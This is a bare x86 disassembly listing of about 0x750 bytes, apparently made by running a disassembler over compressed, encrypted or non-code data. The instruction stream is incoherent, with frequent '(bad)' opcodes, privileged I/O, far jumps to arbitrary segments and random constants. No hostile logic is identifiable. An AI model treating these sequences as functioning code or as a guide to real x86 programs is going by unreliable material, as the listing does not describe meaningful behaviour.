  40c4a0:	bound  esi,QWORD PTR [esi]
  40c4a2:	mov    esp,DWORD PTR [eax+0x2e]
  40c4a5:	pop    ds
  40c4a6:	push   ds
  40c4a7:	xchg   ecx,eax
  40c4a8:	push   cs
  40c4a9:	mov    DWORD PTR [esi-0x215f498e],0x56804b79
  40c4b3:	aad    0x8f
  40c4b5:	cmp    DWORD PTR [ecx+eax*1-0x4d],edx
  40c4b9:	fimul  WORD PTR [eax-0x58f93146]
  40c4bf:	push   ebp
  40c4c0:	sub    al,0x8a
  40c4c2:	fimul  DWORD PTR [esi-0x2]
  40c4c5:	dec    edi
  40c4c6:	push   0x4a860931
  40c4cb:	pop    edx
  40c4cc:	add    ah,dh
  40c4ce:	inc    ebx
  40c4cf:	fs sahf 
  40c4d1:	fcom   DWORD PTR [esi+0x59]
  40c4d4:	aam    0x21
  40c4d6:	jg     0x40c465
  40c4d8:	and    eax,0xf4b56ef5
  40c4dd:	jl     0x40c528
  40c4df:	rcr    dh,cl
  40c4e1:	popf   
  40c4e2:	lahf   
  40c4e3:	popf   
  40c4e4:	ret    
  40c4e5:	(bad)  
  40c4e7:	mov    al,0x89
  40c4e9:	pushf  
  40c4ea:	call   DWORD PTR [ecx]
  40c4ec:	xchg   esi,eax
  40c4ed:	std    
  40c4ee:	repnz push 0x8475361
  40c4f4:	xor    eax,0x6c011ac4
  40c4f9:	mov    ebp,0x6f72849f
  40c4fe:	push   ss
  40c4ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c500:	jne    0x40c4bf
  40c502:	inc    ecx
  40c503:	jnp    0x40c48c
  40c505:	xchg   esi,eax
  40c506:	loop   0x40c525
  40c508:	test   al,0xa8
  40c50a:	daa    
  40c50b:	ror    DWORD PTR [edx],cl
  40c50d:	mov    esp,0x7156b6da
  40c512:	push   ecx
  40c513:	adc    BYTE PTR [edx-0x59d61208],dh
  40c519:	xchg   edx,eax
  40c51a:	push   esi
  40c51b:	fwait
  40c51c:	cmp    ebp,ebx
  40c51e:	mov    esi,0xd6d02ae4
  40c523:	mov    ds:0xed8d18ba,al
  40c528:	sub    al,0xc1
  40c52a:	mov    ebx,0x9297109a
  40c52f:	and    ecx,DWORD PTR [ebx+esi*4]
  40c532:	mov    edx,0x3ead6e6d
  40c537:	xchg   BYTE PTR [ebx-0x3d],dl
  40c53a:	mov    dh,BYTE PTR [ebp+edi*8-0x682e13b3]
  40c541:	xchg   ecx,eax
  40c542:	sbb    al,0x6c
  40c544:	arpl   WORD PTR [edx+eax*2-0x7d94ceac],sp
  40c54b:	push   ecx
  40c54c:	out    0xf6,al
  40c54e:	jns    0x40c52a
  40c550:	xor    al,0x8f
  40c552:	and    al,0x5c
  40c554:	cmp    edi,DWORD PTR [esi-0x23]
  40c557:	mov    dl,0x81
  40c559:	pop    esp
  40c55a:	into   
  40c55b:	iret   
  40c55c:	ret    0x2d9b
  40c55f:	push   esi
  40c560:	loopne 0x40c5b5
  40c562:	xchg   ebp,eax
  40c563:	fs jae 0x40c593
  40c566:	adc    al,0x73
  40c568:	xor    ecx,DWORD PTR [ebp+0x7]
  40c56b:	mov    dl,0xa3
  40c56e:	sub    eax,0xa67b4d66
  40c573:	dec    edi
  40c574:	cmp    eax,0x8d0d818f
  40c579:	fild   DWORD PTR [eax]
  40c57b:	pop    es
  40c57c:	stc    
  40c57d:	cmp    ebx,DWORD PTR [ebx+eiz*4+0x6b]
  40c581:	ins    BYTE PTR es:[edi],dx
  40c582:	addr16 call 0x767a:0xa117d769
  40c58a:	ds fdivrp st(5),st
  40c58d:	jp     0x40c5c0
  40c58f:	mov    dh,0x6f
  40c591:	jp     0x40c5a3
  40c593:	int3   
  40c594:	(bad)  
  40c595:	js     0x40c54e
  40c597:	lock xor bh,BYTE PTR [ebp-0x2cb65349]
  40c59e:	int3   
  40c59f:	ret    0x1d2e
  40c5a2:	mov    ecx,0xc2b1b90
  40c5a7:	aas    
  40c5a8:	mov    BYTE PTR [ecx],al
  40c5aa:	cs jmp 0xbe2a7aef
  40c5b0:	retf   0x6f9e
  40c5b3:	add    cl,BYTE PTR [ecx+0x7d]
  40c5b6:	popf   
  40c5b7:	aas    
  40c5b8:	or     BYTE PTR [ebp-0x60],ch
  40c5bb:	je     0x40c5ef
  40c5bd:	in     eax,dx
  40c5be:	jg     0x40c552
  40c5c0:	fs inc esi
  40c5c2:	jno    0x40c601
  40c5c4:	mov    BYTE PTR ds:0x832433dc,ah
  40c5ca:	dec    ebx
  40c5cb:	pop    eax
  40c5cc:	inc    edx
  40c5cd:	outs   dx,BYTE PTR ds:[esi]
  40c5ce:	mov    bl,0xa0
  40c5d0:	rcr    DWORD PTR [ebp+0x3f],0x6f
  40c5d4:	sub    ebp,ecx
  40c5d6:	fwait
  40c5d7:	mov    cl,0x92
  40c5d9:	mov    ecx,0xe873dc89
  40c5de:	fidiv  DWORD PTR [ebx+0x19]
  40c5e1:	mov    bh,0x30
  40c5e3:	mov    cs,WORD PTR [esi]
  40c5e5:	popf   
  40c5e6:	loop   0x40c5ef
  40c5e8:	sbb    al,0xc5
  40c5eb:	ror    BYTE PTR [ebp+0x6bbc54e0],1
  40c5f1:	inc    eax
  40c5f2:	fwait
  40c5f3:	xor    cl,dh
  40c5f5:	popf   
  40c5f6:	xchg   DWORD PTR [ecx],ebx
  40c5f8:	(bad)  
  40c5f9:	sub    al,ch
  40c5fb:	fucompp 
  40c5fd:	leave  
  40c5fe:	lds    ecx,FWORD PTR [ebx-0x5d]
  40c601:	mov    eax,0x7aedd37f
  40c606:	or     DWORD PTR [eax-0x6458a82e],0x55
  40c60d:	leave  
  40c60e:	fbstp  TBYTE PTR [ebp-0x77]
  40c611:	dec    esi
  40c612:	inc    esp
  40c613:	bnd jp 0x40c626
  40c616:	clc    
  40c617:	scas   al,BYTE PTR es:[edi]
  40c618:	sbb    BYTE PTR [edx+0x603d62d1],0x27
  40c61f:	mov    ebp,0xfdc54d91
  40c624:	add    eax,0xfb59f024
  40c629:	bound  ecx,QWORD PTR [edx-0x6e]
  40c62c:	hlt    
  40c62d:	in     al,dx
  40c62e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c62f:	push   eax
  40c630:	add    esi,DWORD PTR [eax]
  40c632:	mov    ecx,0xbefc2e7e
  40c637:	scas   al,BYTE PTR es:[edi]
  40c638:	adc    esi,edx
  40c63a:	int    0x80
  40c63c:	je     0x40c5e3
  40c63e:	mov    ebp,0x23ab4eb8
  40c643:	mov    al,ds:0x79960685
  40c648:	shr    DWORD PTR [eax-0x71],cl
  40c64b:	es dec ebx
  40c64d:	sbb    BYTE PTR [ecx],dl
  40c64f:	dec    esp
  40c650:	sbb    BYTE PTR [edi-0x52],0xb
  40c654:	jecxz  0x40c6d1
  40c656:	or     ah,BYTE PTR [ecx]
  40c658:	andps  xmm0,XMMWORD PTR [ebp+0xc]
  40c65c:	pushf  
  40c65d:	add    DWORD PTR [ecx+0x7a],esp
  40c660:	and    bh,BYTE PTR [eax+0x2c]
  40c663:	cmp    DWORD PTR [eax-0x2d],ebp
  40c666:	push   es
  40c667:	or     al,0x54
  40c669:	bswap  ecx
  40c66b:	in     eax,0x3a
  40c66d:	xchg   edi,eax
  40c66e:	jbe    0x40c641
  40c670:	fdivr  DWORD PTR [edi+0x3d]
  40c673:	sbb    al,0xb1
  40c675:	jb     0x40c65b
  40c677:	fdiv   QWORD PTR [ecx+0x34]
  40c67a:	mov    ebp,0x712d38db
  40c67f:	leave  
  40c680:	ins    DWORD PTR es:[edi],dx
  40c681:	jae    0x40c693
  40c683:	outs   dx,BYTE PTR ds:[esi]
  40c684:	jp     0x40c6d7
  40c686:	fdiv   DWORD PTR [ebx-0x78]
  40c689:	inc    ecx
  40c68a:	adc    edi,DWORD PTR [edi]
  40c68c:	pop    es
  40c68d:	ret    
  40c68e:	pusha  
  40c68f:	push   edi
  40c690:	mov    ebx,0x764ef7f2
  40c695:	push   esp
  40c696:	lea    eax,[si]
  40c699:	fcomp  DWORD PTR [esi+0x4767bfba]
  40c69f:	das    
  40c6a0:	and    bl,BYTE PTR [eax+0x4cf4dd1]
  40c6a6:	sub    ecx,DWORD PTR [eax+eiz*4-0x20]
  40c6aa:	add    bl,BYTE PTR [eax-0x42e1b631]
  40c6b0:	clc    
  40c6b1:	into   
  40c6b2:	ror    BYTE PTR [edx],1
  40c6b4:	sbb    eax,0xfa1ee928
  40c6b9:	leave  
  40c6ba:	mov    eax,ds:0xc67d5f6c
  40c6bf:	sub    al,0x31
  40c6c1:	mov    BYTE PTR ds:0x90c7acc7,cl
  40c6c7:	cs rol eax,0xab
  40c6cb:	pop    ecx
  40c6cc:	ret    
  40c6cd:	push   edi
  40c6ce:	nop
  40c6cf:	neg    DWORD PTR [ecx+0x51]
  40c6d2:	imul   ebx,DWORD PTR [edi+0xa],0xffffffed
  40c6d6:	test   BYTE PTR [edi+0x67],dl
  40c6d9:	data16 sbb ch,ah
  40c6dc:	jecxz  0x40c6c1
  40c6de:	push   eax
  40c6df:	scas   al,BYTE PTR es:[edi]
  40c6e0:	jmp    0xf215:0x3ec65236
  40c6e7:	hlt    
  40c6e8:	fwait
  40c6e9:	ins    DWORD PTR es:[edi],dx
  40c6ea:	icebp  
  40c6eb:	arpl   WORD PTR [ebp-0x35],dx
  40c6ee:	jmp    0x392a:0xbc2d7ce7
  40c6f5:	(bad)  
  40c6f6:	outs   dx,BYTE PTR ds:[esi]
  40c6f7:	mov    ah,BYTE PTR [ecx+0x6]
  40c6fa:	jne    0x40c71b
  40c6fc:	sti    
  40c6fd:	cmp    eax,0x1ad30623
  40c702:	xor    ah,BYTE PTR [ebp+0x1f83678a]
  40c708:	jbe    0x40c700
  40c70a:	shl    bh,1
  40c70c:	out    dx,eax
  40c70d:	xor    DWORD PTR [eax+0x44dcd817],esp
  40c713:	hlt    
  40c714:	adc    al,0x61
  40c716:	mov    ds:0xb9db440,al
  40c71b:	fdivr  DWORD PTR [edx+0x62]
  40c71e:	push   edi
  40c71f:	lods   eax,DWORD PTR ds:[esi]
  40c720:	jae    0x40c73b
  40c722:	fsubrp st(2),st
  40c724:	add    edx,DWORD PTR [edi+0x15]
  40c727:	lea    esp,[ecx+0xe0e4f39]
  40c72d:	xor    eax,0x1daeb64f
  40c732:	mov    esi,0x926b52fe
  40c737:	mov    dh,BYTE PTR [eax+0x394acce5]
  40c73d:	pusha  
  40c73e:	call   esi
  40c740:	xor    esi,DWORD PTR [esi]
  40c742:	push   esi
  40c743:	daa    
  40c744:	cmp    esi,ecx
  40c746:	cmp    al,0x99
  40c748:	mov    ah,dl
  40c74a:	cmp    DWORD PTR [esi+0x589ad96f],0xe89a2f8a
  40c754:	fmul   QWORD PTR [ebx-0x42]
  40c757:	mov    al,0xfe
  40c759:	ficomp DWORD PTR [eax-0x51]
  40c75c:	xchg   bh,dl
  40c75e:	add    ebx,edi
  40c760:	pop    edi
  40c761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c762:	mov    ecx,0xe27c914d
  40c767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c768:	mov    ds,ebx
  40c76a:	pop    esi
  40c76b:	ss retf 0x715e
  40c76f:	shr    BYTE PTR [ebp-0x50],1
  40c772:	(bad)  
  40c773:	pop    ss
  40c774:	clc    
  40c775:	ret    0x4710
  40c778:	test   BYTE PTR [esp+eiz*2],ah
  40c77b:	inc    ebx
  40c77c:	repnz sub eax,0x226b893c
  40c782:	in     al,0xfa
  40c784:	fiadd  DWORD PTR [edi+0x24]
  40c787:	dec    edx
  40c788:	push   es
  40c789:	loop   0x40c712
  40c78b:	xor    al,0x62
  40c78d:	or     al,0x5f
  40c78f:	dec    eax
  40c790:	(bad)  
  40c791:	aas    
  40c792:	out    0xde,al
  40c794:	pop    esp
  40c795:	les    ecx,FWORD PTR [edx-0x1d]
  40c798:	sahf   
  40c799:	adc    al,0x85
  40c79b:	sub    bl,0x73
  40c79e:	inc    ebx
  40c79f:	push   esp
  40c7a0:	(bad)  
  40c7a1:	test   al,0x3c
  40c7a3:	scas   al,BYTE PTR es:[edi]
  40c7a4:	test   eax,0x9be8a3c7
  40c7a9:	lea    eax,[ecx]
  40c7ab:	push   cs
  40c7ac:	xlat   BYTE PTR ds:[ebx]
  40c7ad:	jmp    0x40c7ef
  40c7af:	push   cs
  40c7b0:	shl    BYTE PTR ds:0xf2d17fc8,cl
  40c7b6:	rol    BYTE PTR [ebx-0x4a24fd3a],0xbc
  40c7bd:	jge    0x40c7bf
  40c7bf:	mov    ah,BYTE PTR [edx]
  40c7c1:	mov    bh,0x6d
  40c7c3:	mov    ds:0xdba314ff,al
  40c7c8:	int3   
  40c7c9:	shr    BYTE PTR [eax],cl
  40c7cb:	outs   dx,BYTE PTR ds:[esi]
  40c7cc:	aad    0xee
  40c7ce:	lahf   
  40c7cf:	fist   WORD PTR [ebp+0x6fdfa556]
  40c7d5:	outs   dx,BYTE PTR ds:[esi]
  40c7d6:	add    eax,0x3eeb213c
  40c7db:	cmp    al,0x84
  40c7dd:	push   es
  40c7de:	ins    DWORD PTR es:[edi],dx
  40c7df:	sbb    edx,DWORD PTR [edi]
  40c7e1:	scas   eax,DWORD PTR es:[edi]
  40c7e2:	adc    edx,eax
  40c7e4:	inc    BYTE PTR [esi+esi*8]
  40c7e7:	popf   
  40c7e8:	fidivr DWORD PTR ds:0x4040ac9d
  40c7ee:	fst    QWORD PTR [edi-0x57]
  40c7f1:	bound  ebp,QWORD PTR [edi+0x32]
  40c7f4:	mov    esp,0xb3528e42
  40c7f9:	imul   DWORD PTR [ebx+eiz*1]
  40c7fc:	stos   DWORD PTR es:[edi],eax
  40c7fd:	fcomp  DWORD PTR [edx+eax*1]
  40c800:	mov    ebp,0x84983421
  40c805:	and    DWORD PTR [edi],esp
  40c807:	gs aas 
  40c809:	push   cs
  40c80a:	pop    esp
  40c80b:	sahf   
  40c80c:	es inc esp
  40c80e:	push   ecx
  40c80f:	fiadd  DWORD PTR [eax-0x3fc89f30]
  40c815:	cmp    BYTE PTR [ebx-0x1e],bl
  40c818:	arpl   WORD PTR [edi+ebx*1],di
  40c81b:	sub    eax,0x58bdd958
  40c820:	mov    ebx,0xa0a10f0c
  40c825:	and    eax,0x5dd73141
  40c82a:	sbb    edx,DWORD PTR [ebx-0x611b1e04]
  40c830:	jl     0x40c8ae
  40c832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c833:	sub    edx,edx
  40c835:	push   ebp
  40c836:	pop    eax
  40c837:	mov    es:0x35cb7c70,eax
  40c83d:	jo     0x40c8be
  40c83f:	push   0x3b
  40c841:	sbb    al,0xec
  40c843:	mov    DWORD PTR [esp+esi*8+0x50f8c212],ebp
  40c84a:	push   cs
  40c84b:	(bad)  
  40c84d:	pushf  
  40c84e:	imul   eax,DWORD PTR [edx],0xffffff91
  40c851:	pop    esp
  40c852:	pushf  
  40c853:	call   0xa308:0x80abdd6e
  40c85a:	(bad)  
  40c85b:	and    ah,BYTE PTR [esp+edi*4]
  40c85e:	xor    al,0xc0
  40c860:	popf   
  40c861:	out    dx,eax
  40c862:	add    eax,0xc004663d
  40c867:	retf   
  40c868:	mov    ds:0x5565fbd3,al
  40c86d:	enter  0x94a0,0xc2
  40c871:	or     al,0x28
  40c873:	retf   
  40c874:	push   cs
  40c875:	or     eax,0xa7c8d762
  40c87a:	int3   
  40c87b:	aad    0x37
  40c87d:	jno    0x40c833
  40c87f:	dec    eax
  40c880:	inc    ebp
  40c881:	jne    0x40c874
  40c883:	lods   al,BYTE PTR ds:[esi]
  40c884:	or     dh,BYTE PTR [edx+edx*8]
  40c887:	fnstenv [ecx]
  40c889:	rcl    BYTE PTR ds:0x58fddaa4,0x6b
  40c890:	lahf   
  40c891:	fild   QWORD PTR [edi+0x1c]
  40c894:	mov    ds:0x648cf44a,eax
  40c899:	mov    dl,0x98
  40c89b:	out    0x36,al
  40c89d:	mov    al,ds:0x936cde1c
  40c8a2:	mov    ch,BYTE PTR [ebx+eax*4+0x33d10925]
  40c8a9:	xchg   edx,eax
  40c8aa:	outs   dx,DWORD PTR ds:[esi]
  40c8ab:	into   
  40c8ac:	xor    esi,eax
  40c8ae:	std    
  40c8af:	or     edx,edi
  40c8b1:	jmp    0x40c926
  40c8b3:	pop    edi
  40c8b4:	mov    BYTE PTR [edx-0x35],ch
  40c8b7:	xor    BYTE PTR [edx],al
  40c8b9:	push   ebp
  40c8ba:	push   edi
  40c8bb:	mov    edx,0x14109b5
  40c8c0:	hlt    
  40c8c1:	or     eax,DWORD PTR [edx+0x40c246d5]
  40c8c7:	mov    ah,0xe2
  40c8c9:	xor    dl,cl
  40c8cb:	dec    edx
  40c8cc:	jmp    0x40c932
  40c8ce:	inc    esi
  40c8cf:	int3   
  40c8d0:	inc    esi
  40c8d1:	xchg   bh,ah
  40c8d3:	int3   
  40c8d4:	dec    ebp
  40c8d5:	sbb    bh,BYTE PTR [edi+ebx*8]
  40c8d8:	inc    esp
  40c8d9:	push   ebx
  40c8da:	in     al,dx
  40c8db:	(bad)  
  40c8dc:	sub    eax,0xbd6bbb35
  40c8e1:	mov    ds:0x7a5e1e70,eax
  40c8e6:	pop    ss
  40c8e7:	sar    BYTE PTR [ecx],0xd3
  40c8ea:	call   0xcde0c97a
  40c8ef:	push   es
  40c8f0:	mov    cl,BYTE PTR [ecx]
  40c8f2:	mov    esp,0xcd86412e
  40c8f7:	int3   
  40c8f8:	mov    ebp,0x8b269c3e
  40c8fd:	sub    eax,0xa88c1c69
  40c902:	stos   BYTE PTR es:[edi],al
  40c903:	pop    es
  40c904:	pusha  
  40c905:	mov    eax,0x996c3b08
  40c90a:	xchg   ebp,eax
  40c90b:	mov    esi,0xc6cc6340
  40c910:	pop    ss
  40c911:	in     al,0x54
  40c913:	mov    ds:0xdfd8eaab,eax
  40c918:	mov    ch,0xc0
  40c91a:	(bad)  
  40c91b:	pusha  
  40c91c:	sub    BYTE PTR [ebx-0x61260b41],dl
  40c922:	(bad)  
  40c923:	nop
  40c924:	ins    DWORD PTR es:[edi],dx
  40c925:	ja     0x40c8bd
  40c927:	mov    dl,0x27
  40c929:	sub    BYTE PTR [edi],dh
  40c92b:	mov    bl,0x7b
  40c92d:	and    esi,DWORD PTR [edx+0x2171c4d8]
  40c933:	pushf  
  40c934:	pop    ebx
  40c935:	js     0x40c932
  40c937:	test   al,0x81
  40c939:	lahf   
  40c93a:	loop   0x40c925
  40c93c:	sub    al,0x5c
  40c93e:	(bad)  
  40c940:	(bad)  
  40c941:	dec    ebx
  40c942:	pop    es
  40c943:	popa   
  40c944:	push   ebx
  40c945:	popa   
  40c946:	pop    ss
  40c947:	stos   BYTE PTR es:[edi],al
  40c948:	out    dx,eax
  40c949:	or     al,0xbc
  40c94b:	call   0x89f43de1
  40c950:	std    
  40c951:	push   0xbd55b29
  40c956:	ins    DWORD PTR es:[edi],dx
  40c957:	cmp    eax,0x714e16dd
  40c95c:	and    DWORD PTR [ebx+0x1946b289],ecx
  40c962:	jmp    0xf1d8c1c
  40c967:	jl     0x40c98d
  40c969:	daa    
  40c96a:	sub    al,0x73
  40c96c:	push   ebp
  40c96d:	sub    eax,0xb957745e
  40c972:	aaa    
  40c973:	dec    esi
  40c974:	dec    esi
  40c975:	movzx  ebp,BYTE PTR [ecx+ecx*2+0x6c]
  40c97a:	jmp    FWORD PTR [edi+ecx*2]
  40c97d:	test   al,0xcb
  40c97f:	ss pop ebx
  40c981:	mov    eax,ds:0x6a4790f8
  40c986:	or     al,0xa0
  40c988:	push   esi
  40c989:	or     BYTE PTR [ebx+0x14],al
  40c98c:	outs   dx,BYTE PTR ds:[esi]
  40c98d:	stos   DWORD PTR es:[edi],eax
  40c98e:	sub    bh,BYTE PTR [ebp+0x56e81d06]
  40c994:	jnp    0x40c9f9
  40c996:	stos   BYTE PTR es:[edi],al
  40c997:	popf   
  40c998:	and    ch,ah
  40c99a:	inc    ebx
  40c99b:	jle    0x40ca15
  40c99d:	(bad)  
  40c99e:	jle    0x40c98b
  40c9a0:	jl     0x40c947
  40c9a2:	stc    
  40c9a3:	xor    al,BYTE PTR [ecx+0x77]
  40c9a6:	gs pushf 
  40c9a8:	sbb    al,0xae
  40c9aa:	dec    edi
  40c9ab:	mov    cs,WORD PTR [ebp-0x1a]
  40c9ae:	scas   al,BYTE PTR es:[edi]
  40c9af:	(bad)  [ebp+ebp*8+0x12]
  40c9b3:	cmp    ebx,DWORD PTR [ebp+0x2ff60072]
  40c9b9:	cs push 0x1e
  40c9bc:	(bad)  
  40c9bd:	out    dx,eax
  40c9be:	sub    esp,DWORD PTR [edx]
  40c9c0:	mov    ebp,0x10837a63
  40c9c5:	or     edi,edi
  40c9c7:	int3   
  40c9c8:	test   al,0xfb
  40c9cb:	in     eax,dx
  40c9cc:	inc    esp
  40c9cd:	sbb    bh,BYTE PTR [esi-0x5]
  40c9d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9d1:	cmp    al,0x79
  40c9d3:	lods   eax,DWORD PTR ds:[esi]
  40c9d4:	inc    edi
  40c9d5:	xor    esp,DWORD PTR [edi]
  40c9d7:	sahf   
  40c9d8:	xor    esp,esi
  40c9da:	(bad)  
  40c9db:	mov    al,ds:0x645917c9
  40c9e0:	add    eax,0x28ca96fa
  40c9e5:	mov    esi,0x121ccb54
  40c9ea:	pusha  
  40c9eb:	inc    ebp
  40c9ec:	mov    dh,0x6b
  40c9ee:	shl    DWORD PTR [edx+0x35],1
  40c9f1:	inc    esi
  40c9f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9f3:	push   ebx
  40c9f4:	or     al,0x5a
  40c9f6:	inc    edi
  40c9f7:	icebp  
  40c9f8:	push   esi
  40c9f9:	out    dx,al
  40c9fa:	pop    ecx
  40c9fb:	addr16 loope 0x40ca53
  40c9fe:	imul   BYTE PTR [esi]
  40ca00:	jmp    0x910878cb
  40ca05:	jmp    0x8d5314dc
  40ca0a:	in     al,dx
  40ca0b:	int    0x5f
  40ca0d:	addr16 xor eax,0xf599d093
  40ca13:	xor    al,0xda
  40ca15:	fucomp st(2)
  40ca17:	adc    BYTE PTR [ecx-0x445434b0],ch
  40ca1d:	mov    bl,0x37
  40ca1f:	sbb    DWORD PTR [ebx+0x60],ebx
  40ca22:	(bad)  
  40ca23:	dec    esi
  40ca24:	xor    ebx,DWORD PTR [edi+0x501555f2]
  40ca2a:	popa   
  40ca2b:	repnz xchg ebp,eax
  40ca2e:	inc    eax
  40ca2f:	jae    0x40ca46
  40ca31:	ins    BYTE PTR es:[edi],dx
  40ca32:	dec    ecx
  40ca33:	sub    ebp,ebx
  40ca35:	imul   eax,DWORD PTR [eax+0x18],0x1e
  40ca39:	cld    
  40ca3a:	loop   0x40ca16
  40ca3c:	not    ebx
  40ca3e:	int    0x53
  40ca40:	and    ch,BYTE PTR [ecx+0x600ac457]
  40ca46:	jmp    0x40cac3
  40ca48:	imul   edx,DWORD PTR [edi-0x3a],0x8d5c44ef
  40ca4f:	sar    BYTE PTR [esi+0x77],cl
  40ca52:	fsubp  st(2),st
  40ca54:	fdivr  DWORD PTR [ebx]
  40ca56:	mov    eax,0xdf839e63
  40ca5b:	push   edx
  40ca5c:	pop    es
  40ca5d:	ins    DWORD PTR es:[edi],dx
  40ca5e:	mov    ecx,esp
  40ca60:	stos   DWORD PTR es:[edi],eax
  40ca61:	mov    esp,0x65f9e4b8
  40ca66:	xor    ah,BYTE PTR [ecx+0x2b]
  40ca69:	in     eax,0xc5
  40ca6b:	mov    bl,0xa4
  40ca6d:	in     al,0xf7
  40ca6f:	and    BYTE PTR [edx],cl
  40ca71:	retf   0xd439
  40ca74:	scas   al,BYTE PTR es:[edi]
  40ca75:	or     eax,DWORD PTR [ebp+0x52]
  40ca78:	dec    edi
  40ca79:	add    edx,DWORD PTR [ecx-0x2646aa67]
  40ca7f:	add    BYTE PTR [edi],bl
  40ca81:	add    cl,bl
  40ca83:	add    al,bl
  40ca85:	test   BYTE PTR [ebx+0x39377efe],bh
  40ca8b:	xchg   esp,eax
  40ca8c:	ficomp WORD PTR [eax+0x27f3048a]
  40ca92:	push   eax
  40ca93:	and    bh,BYTE PTR [esi+0x41291c33]
  40ca99:	cmp    DWORD PTR [ebx],0x30
  40ca9c:	ret    0xcf14
  40ca9f:	sub    esp,esp
  40caa1:	cwde   
  40caa2:	xor    DWORD PTR [ebp+0x702d9130],eax
  40caa8:	js     0x40caa7
  40caaa:	in     eax,0xaf
  40caac:	aam    0x2
  40caae:	not    DWORD PTR [ebx-0x295964bc]
  40cab4:	cmp    al,0xca
  40cab6:	call   0xb7fdeb9
  40cabb:	push   eax
  40cabc:	xor    dl,BYTE PTR [edx]
  40cabe:	mov    al,0x98
  40cac0:	call   0xf892:0xd01d26bf
  40cac7:	inc    ebx
  40cac8:	cmp    esi,DWORD PTR [edi]
  40caca:	xchg   eax,edx
  40cacc:	add    DWORD PTR [ecx-0x27734a39],esp
  40cad2:	inc    eax
  40cad3:	outs   dx,DWORD PTR ds:[esi]
  40cad4:	int3   
  40cad5:	fs pop edi
  40cad7:	and    al,0x18
  40cad9:	xor    al,0x36
  40cadb:	sbb    al,0x7e
  40cadd:	xchg   ebp,eax
  40cade:	mov    bh,0xfe
  40cae0:	cmp    eax,0x5baf1008
  40cae5:	xor    BYTE PTR [edi+edx*4+0x467bf0b6],cl
  40caec:	fisub  WORD PTR [ecx+0x57]
  40caef:	mov    edi,fs
  40caf1:	add    dh,al
  40caf3:	jnp    0x40cb5f
  40caf5:	sbb    ebp,DWORD PTR [ebp+0x60d71265]
  40cafb:	imul   ebp,DWORD PTR [edx-0x4d],0xde5b7b0
  40cb02:	dec    edi
  40cb03:	repnz sbb ecx,DWORD PTR [edi+0x24]
  40cb07:	xchg   DWORD PTR [ebp+0x78],edx
  40cb0a:	popa   
  40cb0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb0c:	cmp    al,0xe4
  40cb0e:	and    eax,edi
  40cb10:	pop    edx
  40cb11:	int3   
  40cb12:	ja     0x40cb2b
  40cb14:	mov    al,0x65
  40cb16:	getsec 
  40cb18:	push   0x73383004
  40cb1d:	jae    0x40cb6b
  40cb1f:	mov    eax,ds:0x1d10389d
  40cb24:	cld    
  40cb25:	scas   eax,DWORD PTR es:[edi]
  40cb26:	mov    eax,0xdbb75dcd
  40cb2b:	pop    ecx
  40cb2c:	mov    cl,ch
  40cb2e:	mov    edx,0x4af093e6
  40cb33:	sbb    ecx,edx
  40cb35:	add    DWORD PTR [eax+0x1b],0x44
  40cb39:	dec    edx
  40cb3a:	cmp    ecx,DWORD PTR [edi+0x1]
  40cb3d:	jg     0x40cb58
  40cb3f:	pop    ds
  40cb40:	push   esp
  40cb41:	sbb    DWORD PTR [esi-0x4d190788],esi
  40cb47:	cmp    ebx,esi
  40cb49:	or     al,0xdc
  40cb4b:	aam    0x60
  40cb4d:	cdq    
  40cb4e:	push   esp
  40cb4f:	mov    edi,0xc5c6c986
  40cb54:	dec    eax
  40cb55:	dec    ebp
  40cb56:	stc    
  40cb57:	xchg   edx,eax
  40cb58:	test   bl,al
  40cb5a:	cmp    DWORD PTR [edi-0x1545439c],ebx
  40cb60:	arpl   WORD PTR ds:0xf61f2d48,dx
  40cb66:	add    edx,DWORD PTR [ecx]
  40cb68:	iret   
  40cb69:	jbe    0x40cbaf
  40cb6b:	mov    ch,0x5
  40cb6d:	mov    bh,0x54
  40cb6f:	jmp    0x40cb0d
  40cb71:	in     eax,0x6
  40cb73:	mov    ecx,DWORD PTR [eax]
  40cb75:	adc    al,BYTE PTR [esi]
  40cb77:	jge    0x40cb88
  40cb79:	pop    ebp
  40cb7a:	sbb    al,0x74
  40cb7c:	clc    
  40cb7d:	adc    BYTE PTR [esp+ebx*1-0x2f],0xf
  40cb82:	inc    eax
  40cb83:	out    0x97,al
  40cb85:	cld    
  40cb86:	stos   DWORD PTR es:[edi],eax
  40cb87:	jbe    0x40cb62
  40cb89:	fs xchg edi,eax
  40cb8b:	jge    0x40cb36
  40cb8d:	int    0xc6
  40cb8f:	cmp    DWORD PTR [edi],esi
  40cb91:	test   eax,0x6dcf3ea9
  40cb96:	test   DWORD PTR [edi+0x2de4663a],eax
  40cb9c:	repz rcl BYTE PTR [ecx-0x28],0xf8
  40cba1:	push   edi
  40cba2:	xlat   BYTE PTR ds:[ebx]
  40cba3:	jns    0x40cbdb
  40cba5:	pop    edi
  40cba6:	xchg   ebx,eax
  40cba7:	jne    0x40cb54
  40cba9:	dec    edi
  40cbaa:	rcl    dh,1
  40cbac:	in     al,0xc3
  40cbae:	xchg   esi,eax
  40cbaf:	sub    al,0x90
  40cbb1:	inc    esi
  40cbb2:	jbe    0x40cc0d
  40cbb4:	xchg   DWORD PTR [eax-0x76],edi
  40cbb7:	mov    edi,0xdb7042b9
  40cbbc:	pop    ds
  40cbbd:	pop    DWORD PTR [ebx-0x287a536b]
  40cbc3:	call   0xf1f7a03
  40cbc8:	outs   dx,DWORD PTR es:[esi]
  40cbca:	add    bl,BYTE PTR [ebp-0x352c3fc8]
  40cbd0:	xor    DWORD PTR [eax+0x1],ebx
  40cbd3:	mov    cl,0xc3
  40cbd5:	scas   eax,DWORD PTR es:[edi]
  40cbd6:	mov    ah,0x74
  40cbd8:	pop    ecx
  40cbd9:	add    al,0x96
  40cbdb:	mov    ah,0xa
  40cbdd:	adc    eax,0x54c2bb3d
  40cbe2:	mov    esp,0x7167182c
  40cbe7:	outs   dx,BYTE PTR ds:[esi]
  40cbe8:	jmp    esi
  40cbea:	je     0x40cbc1
  40cbec:	sub    esi,ebp
  40cbee:	mov    eax,0x662822b3
